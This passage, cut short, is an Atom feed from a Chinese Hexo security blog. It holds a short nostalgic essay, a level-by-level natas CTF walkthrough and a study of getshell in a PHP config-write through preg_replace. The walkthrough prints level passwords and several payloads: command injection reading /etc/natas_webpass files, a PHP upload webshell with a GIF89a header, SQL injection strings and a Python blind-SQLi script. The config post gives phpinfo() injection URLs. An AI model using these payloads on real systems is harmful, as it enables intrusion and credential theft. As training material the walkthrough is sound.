@@ -1,0 +1,2018 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Hello_C技术博客</title>
+  <subtitle>一个小白的独白！</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2017-03-31T07:54:52.412Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>Hello_C</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>时光不老 我们不散</title>
+    <link href="http://yoursite.com/2017/03/31/%E6%97%B6%E5%85%89%E4%B8%8D%E8%80%81-%E6%88%91%E4%BB%AC%E4%B8%8D%E6%95%A3/"/>
+    <id>http://yoursite.com/2017/03/31/时光不老-我们不散/</id>
+    <published>2017-03-31T07:42:30.000Z</published>
+    <updated>2017-03-31T07:54:52.412Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="时光不老，我们不散；岁月不逝，我们不弃"><a href="#时光不老，我们不散；岁月不逝，我们不弃" class="headerlink" title="时光不老，我们不散；岁月不逝，我们不弃"></a>时光不老，我们不散；岁月不逝，我们不弃</h3><p>   天空不知何时划过一颗颗流星，<br>　　飞向同一个星球，<br>　　宛如我们来自不同的城市，<a id="more"></a><br>　　但却相聚在这小小的房子里。<br>　　生命是个漫长又遥远的过程，<br>　　经历着陌生和熟悉，冷漠和温暖。<br>　　时光消磨着岁月的痕迹，<br>　　追着青春的步伐，<br>　　我们哼着歌回忆往昔;<br>　　我们读着书品味诗意;<br>　　我们说着笑讲述自己;<br>　　我们谈着天细数日子。</p>
+<p><img src="http://i2.muimg.com/567571/5fcda118895c7351.jpg" alt=""></p>
+<p>   梦里花开，清风飘过，<br>　　桌上的书页正谱写动人的旋律。<br>　　白色的墙是你我最坚实的港湾，<br>　　小小的房子里住着我们的记忆，<br>　　灯光的照明，<br>　　你牵着我的手，<br>　　陪我走过无数个日日夜夜，<br>　　陪我穿梭于春夏秋冬，<br>　　陪我走过生命的旅程。<br>　　又是花开的季节，<br>　　到处都是风车在转，<br>　　记得那个时候，<br>　　你说日子好长，<br>　　你说青春不变梦想满星辰，<br>　　你说记忆犹存沧海桑田，<br>　　你说时光不老我们不散，<br>　　其实那年，<br>　　我们追着风筝奔跑的时候，<br>　　时光就早已悄悄溜走。<br>　　阳光下，<br>　　一行人一排影子，<br>　　还有一串相伴的小脚丫。</p>
+<p>那些曾经一起奋斗的你们现在过得怎么样了？时光不散，我们不老</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;时光不老，我们不散；岁月不逝，我们不弃&quot;&gt;&lt;a href=&quot;#时光不老，我们不散；岁月不逝，我们不弃&quot; class=&quot;headerlink&quot; title=&quot;时光不老，我们不散；岁月不逝，我们不弃&quot;&gt;&lt;/a&gt;时光不老，我们不散；岁月不逝，我们不弃&lt;/h3&gt;&lt;p&gt;   天空不知何时划过一颗颗流星，&lt;br&gt;　　飞向同一个星球，&lt;br&gt;　　宛如我们来自不同的城市，
+    
+    </summary>
+    
+    
+      <category term="杂谈" scheme="http://yoursite.com/tags/%E6%9D%82%E8%B0%88/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>natas通关手册</title>
+    <link href="http://yoursite.com/2017/03/18/natas%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/"/>
+    <id>http://yoursite.com/2017/03/18/natas通关手册/</id>
+    <published>2017-03-18T09:12:44.000Z</published>
+    <updated>2017-03-18T09:23:43.619Z</updated>
+    
+    <content type="html"><![CDATA[<p>前几天看博客发现了一个很不错的网站，natas overthewire是一个和web安全相关的CTF网站，题目设计的还是很精巧的，很值得我们这些学习web安全的做一做。<br>地址：<a href="http://overthewire.org/wargames/natas/" target="_blank" rel="external">http://overthewire.org/wargames/natas/</a></p>
+<p><strong>level 0</strong><br>直接查看源代码，即可从注释中看到密码；<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</div></pre></td></tr></table></figure></p>
+<p><strong>level 1</strong><br>登录进去发现禁止右键，但是可以F12进行审查元素或者查看源代码快捷方式<strong><em>Ctrl+U</em></strong>，密码还是在注释里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</div></pre></td></tr></table></figure></p>
+<p><strong>level 2</strong><br>查看源代码什么也没有发现，就发现有一张图片，想想看看能不能查看files这个目录，结果files目录没有禁止访问，发现files目录下有一个uesrs.txt，打开就有密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</div></pre></td></tr></table></figure></p>
+<p><strong>level 3</strong><br>也是第一反应查看原代码，可是并没有提示。注意这里，Not even google will find it ，说明搜索引擎不会抓取这个相关的页面，说明存在robots.txt。访问之<a href="http://natas3.natas.labs.overthewire.org/robots.txt发现一个s3cr3t的目录打开发现一个users.txt" target="_blank" rel="external">http://natas3.natas.labs.overthewire.org/robots.txt发现一个s3cr3t的目录打开发现一个users.txt</a> 得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</div></pre></td></tr></table></figure></p>
+<p><strong>level 4</strong><br>页面提示<strong><em>You are visiting from “<a href="http://natas4.natas.labs.overthewire.org/index.php" target="_blank" rel="external">http://natas4.natas.labs.overthewire.org/index.php</a>“ while authorized users should come only from “<a href="http://natas5.natas.labs.overthewire.org/" target="_blank" rel="external">http://natas5.natas.labs.overthewire.org/</a>“ </em></strong>，需要我们从natas5页面来访问natas4的页面，我们可以使用burp抓包，增加一个Referer头来指定当前页面来自哪里，即可得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</div></pre></td></tr></table></figure></p>
+<p><strong>level 5</strong><br>发现是一个登录界面，但是提示你没有登录，可以burp抓包进行查看。一般登录验证身份或者状态都是通过cookie，发现cookie参数的一个loggedin的值为0.试着改为1试试看，提示登录成功，得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div></pre></td></tr></table></figure></p>
+<p><strong>level 6</strong><br>登录发现是一个post提交的地方，还可以查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line"></div><div class="line">include &quot;includes/secret.inc&quot;;</div><div class="line"></div><div class="line">    if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</div><div class="line">        if($secret == $_POST[&apos;secret&apos;]) &#123;</div><div class="line">        print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">        print &quot;Wrong secret&quot;;</div><div class="line">    &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>大体就是提交一个数字与include文件里的内容进行对比。尝试访问includes/secret.inc，竟然明晃晃的$secret = “FOEIUWGHFEEUHOFUOIU”;，那么直接输入进去就可以得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</div></pre></td></tr></table></figure></p>
+<p><strong>level 7</strong><br>登录进去就两个没有什么内容的链接，但是链接很有意思?page=home和?page=home，还有提示<strong><em>hint: password for webuser natas8 is in /etc/natas_webpass/natas8</em></strong>，那肯定就是目录遍历咯，?page=/etc/natas_webpass/natas8，得到密码；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</div></pre></td></tr></table></figure></p>
+<p><strong>level 8</strong><br>登录进去发现又是一个post提交的表单，查看关键代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line"></div><div class="line">$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;</div><div class="line"></div><div class="line">function encodeSecret($secret) &#123;</div><div class="line">    return bin2hex(strrev(base64_encode($secret)));</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</div><div class="line">    if(encodeSecret($_POST[&apos;secret&apos;]) == $encodedSecret) &#123;</div><div class="line">    print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">    print &quot;Wrong secret&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>bin2hex函数 将二进制数据转换成十六进制表示<br>strrev() 函数反转字符串<br>已经告诉了我们encodedSecret的值，以及加密方式已经给出，我们可以到着密码方式来，这样可以得到我们需要输入的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo base64_decode(strrev(hex2bin(&quot;3d3d516343746d4d6d6c315669563362&quot;)));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>得到oubWYf2kBq，输入直接得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</div></pre></td></tr></table></figure></p>
+<p><strong>level 9</strong><br>登录发现又是一个输入框，查看关键代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">$key = &quot;&quot;;</div><div class="line"></div><div class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</div><div class="line">    $key = $_REQUEST[&quot;needle&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($key != &quot;&quot;) &#123;</div><div class="line">    passthru(&quot;grep -i $key dictionary.txt&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>发现passthru()函数，它同exec()函数system()函数类似, 也是用来执行外部命令(command)的。提交的参数作为$key执行grep -i $key dictionary.txt命令，想到肯定是命令执行漏洞了。<br>首先就是截断grep命令，可是使用;进行截断，然后根据前面目录遍历的思路查看/etc/natas_webpass/natas9文件，即输入;cat /etc/natas_webpass/natas10 #，得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</div></pre></td></tr></table></figure></p>
+<p><strong>level 10</strong><br>和上一个题目差不多，但就是过滤了; | &amp; 三个符号，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">$key = &quot;&quot;;</div><div class="line"></div><div class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</div><div class="line">    $key = $_REQUEST[&quot;needle&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($key != &quot;&quot;) &#123;</div><div class="line">    if(preg_match(&apos;/[;|&amp;]/&apos;,$key)) &#123;</div><div class="line">        print &quot;Input contains an illegal character!&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">        passthru(&quot;grep -i $key dictionary.txt&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>不能够截断grep了，只能使用grep进行搜索了，根据前面做的题目一直密码都是大小写，我们可以搜索大小字母得到密码，即输入[a-zA-Z] /etc/natas_webpass/natas11 #或者匹配所有.*  /etc/natas_webpass/natas11 #，得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</div></pre></td></tr></table></figure></p>
+<p><strong>level 11</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</div></pre></td></tr></table></figure></p>
+<p><strong>level 12</strong><br>登录发现是一道文件上传类型的题目，查看源代码，发现并未设置文件类型检测，上传后还会告诉我们路径，那么直接上传一个php文件，然后根据路径访问得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    passthru(&apos;cat /etc/natas_webpass/natas13&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>刚开始的时候一直被重命名为jpg，一直很懵逼，然后抓包发现参数k24yezk2tm.jpg，就试着修改为k24yezk2tm.php，则上传上去的就会重名为.php文件。<br><img src="http://p1.bpimg.com/567571/2267a96ab65a6d24.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</div></pre></td></tr></table></figure>
+<p><strong>level 13</strong><br>登录可以看到使用exif_imagetype()来读取文件的第一个字节并检查其签名，判断是否为图像类型说明。<br>那么我们可以在php文件前面添加上jpg图像的前几个字节用来逃避exif_imagetype()函数的验证。其他过程和第一步类似。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GIF89a</div><div class="line">&lt;?php  </div><div class="line">    passthru(&apos;cat /etc/natas_webpass/natas14&apos;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</div></pre></td></tr></table></figure></p>
+<p><strong>level 14</strong><br>登录进去是一个登录界面，第一反应就是试试常见的登录名、密码等弱口令，第二个就是万能密码，第三就是进行注入了，登录名随便，密码为<strong><em>” OR 1=1 #</em></strong>，即可登录成功拿到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</div></pre></td></tr></table></figure></p>
+<p><strong>level 15</strong><br>登录进去也是一个登录的界面，随便输入都是一样的错误提示，当我们输入natas16的时候它会提示用户存在，只给了一个能够判断用户是否存在的东西因此只有通过爆破来攻击。可能我们下一关的用户名和密码存储在数据库中，可以通过错误的提示来判断查询的结果，得出密码。采用sql盲注的技术。<br>查看源代码查询语句为<strong><em>$query = “SELECT </em> from users where username=\””.$_REQUEST[“username”].”\””;*</strong>，我们可以构造查询password的语句，通过查询的结果盲注出密码。即输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * from users where username=\&quot;natas16\&quot; and 32 &lt; ascii(mid(password,1,1)) and \&quot;\&quot; like \&quot;\&quot;</div></pre></td></tr></table></figure></p>
+<p>sql盲注脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"></div><div class="line">import requests</div><div class="line">url = &apos;http://natas15.natas.labs.overthewire.org/index.php&apos;</div><div class="line">username = &apos;natas15&apos;</div><div class="line">password = &apos;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&apos;</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pwd in range(34):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (low+high)&gt;&gt;1  #使用二分法快速查找   </div><div class="line">    </div><div class="line">    while mid&lt;high:</div><div class="line">        #构造查询password来进行匹配</div><div class="line">        payload=&quot; natas16\&quot; and %d &lt; ascii(mid(password,%d,1)) and \&quot;\&quot; like \&quot;&quot; %(mid,pwd)</div><div class="line">        req = requests.post(url, auth = requests.auth.HTTPBasicAuth(username,password),data=&#123;&quot;username&quot;:payload&#125;)</div><div class="line">        #对返回结果进行判断 </div><div class="line">        if req.text.find(&quot;doesn&apos;t exist&quot;)==-1: </div><div class="line">            low = mid+1</div><div class="line">        else:</div><div class="line">            high=mid   </div><div class="line">        mid = (high+low)&gt;&gt;1  #继续二分进行查找</div><div class="line">        </div><div class="line">    key+=chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure></p>
+<p>这样就会根据盲注脚本找到密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</div></pre></td></tr></table></figure></p>
+<p><strong>level 16</strong></p>
+<p><strong>level 17</strong></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;前几天看博客发现了一个很不错的网站，natas overthewire是一个和web安全相关的CTF网站，题目设计的还是很精巧的，很值得我们这些学习web安全的做一做。&lt;br&gt;地址：&lt;a href=&quot;http://overthewire.org/wargames/natas/&quot;&gt;http://overthewire.org/wargames/natas/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;level 0&lt;/strong&gt;&lt;br&gt;直接查看源代码，即可从注释中看到密码；
+    
+    </summary>
+    
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>php正则的经典漏洞</title>
+    <link href="http://yoursite.com/2017/03/16/php%E6%AD%A3%E5%88%99%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yoursite.com/2017/03/16/php正则的经典漏洞/</id>
+    <published>2017-03-16T08:57:01.000Z</published>
+    <updated>2017-03-16T09:09:55.190Z</updated>
+    
+    <content type="html"><![CDATA[<p>p师傅前几天的小密圈的一个问题，这是一个经典的配置文件写入问题漏洞:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(!isset($_GET[&apos;option&apos;])) die();</div><div class="line">$str = addslashes($_GET[&apos;option&apos;]);</div><div class="line">$file = file_get_contents(&apos;./config.php&apos;);</div><div class="line">$file = preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;, &quot;\$option=&apos;$str&apos;;&quot;, $file);</div><div class="line">file_put_contents(&apos;./config.php&apos;, $file);</div></pre></td></tr></table></figure>
+<p>config.php的内容：<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;test&apos;;</div></pre></td></tr></table></figure></p>
+<p>要求是getshell，这个场景十分的经典，经常用在修改配置文件写入的时候。</p>
+<p>首先说说这几个函数：<br><strong>1、addslashes()</strong><br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<pre><code>预定义字符是：
+单引号（&apos;）
+双引号（&quot;）
+反斜杠（\）
+NULL
+</code></pre><p><strong>注释：</strong>默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p>
+<p><strong>2、file_get_contents()</strong><br>file_get_contents() 把整个文件读入一个字符串中。<br>file_get_contents(path,include_path,context,start,max_length) </p>
+<p><strong>3、preg_replace()</strong><br>preg_replace(),执行一个正则表达式的搜索和替换</p>
+<p><strong>4、file_put_contents</strong><br>file_put_contents() 函数把一个字符串写入文件中。<br>file_put_contents(file,data,mode,context)</p>
+<h3 id="0x01-利用反斜线"><a href="#0x01-利用反斜线" class="headerlink" title="0x01 利用反斜线"></a>0x01 利用反斜线</h3><p>输入：\’;phpinfo();//<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=\&apos;;phpinfo();//</div></pre></td></tr></table></figure></p>
+<p>则config.php文件修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;\\&apos;;phpinfo();//&apos;;</div></pre></td></tr></table></figure></p>
+<p>\’经过addslashes()之后变为\\’，随后preg_replace会将两个连续的\合并为一个，也就是将\\’转为\‘，这样我们就成功引入了一个单引号，闭合上文注释下文，中间加入要执行的代码即可。<br>看来是preg_replace函数特性。经测试，该函数会针对反斜线进行转义，即成对出现的两个反斜线合并为一个。<br>这是xdebug分析的跳转：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0006     333912   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">    0.0008     333944     -&gt; addslashes(&apos;\\\&apos;;phpinfo();//&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                           &gt;=&gt; &apos;\\\\\\\&apos;;phpinfo();//&apos;</div><div class="line">                           =&gt; $str = &apos;\\\\\\\&apos;;phpinfo();//&apos; D:\phpstudy\www\index.php:3</div><div class="line">    0.0010     334120     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">    0.0015     334544     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;\\\\\\\&apos;;phpinfo();//\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">    0.0016     334496     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                           &gt;=&gt; 35</div><div class="line">                         &gt;=&gt; 1</div><div class="line">    0.0055 zu</div></pre></td></tr></table></figure></p>
+<h3 id="0x02-利用正则匹配缺陷和换行符-0a"><a href="#0x02-利用正则匹配缺陷和换行符-0a" class="headerlink" title="0x02 利用正则匹配缺陷和换行符%0a"></a>0x02 利用正则匹配缺陷和换行符%0a</h3><p>分两次进行请求：<br><strong>1、第一次传入aaa’;phpinfo();%0a//,</strong>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=aaa&apos;;phpinfo();%0a//</div></pre></td></tr></table></figure></p>
+<p>此时config.php文件变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;aaa\&apos;;phpinfo();</div><div class="line">//&apos;;</div></pre></td></tr></table></figure></p>
+<p>调试过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0005     333944   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">    0.0007     333976     -&gt; addslashes(&apos;aaa\&apos;;phpinfo();\n//&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                           &gt;=&gt; &apos;aaa\\\&apos;;phpinfo();\n//&apos;</div><div class="line">                           =&gt; $str = &apos;aaa\\\&apos;;phpinfo();\n//&apos; D:\phpstudy\www\index.php:3</div><div class="line">    0.0009     334144     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">    0.0012     334552     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">    0.0014     334488     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                           &gt;=&gt; 38</div><div class="line">                         &gt;=&gt; 1</div><div class="line">    0.0051 zu</div></pre></td></tr></table></figure></p>
+<p><strong>2、第二次传入随意的字符</strong><br>例如bbb正则代码.*会将匹配到的aaa\替换为bbb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=bbb</div></pre></td></tr></table></figure></p>
+<p>调试过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0006     333832   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">0.0008     333864     -&gt; addslashes(&apos;bbb&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                       &gt;=&gt; &apos;bbb&apos;</div><div class="line">                       =&gt; $str = &apos;bbb&apos; D:\phpstudy\www\index.php:3</div><div class="line">0.0011     334016     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                       &gt;=&gt; &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;</div><div class="line">                       =&gt; $file = &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">0.0022     334424     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;bbb\&apos;;&apos;, 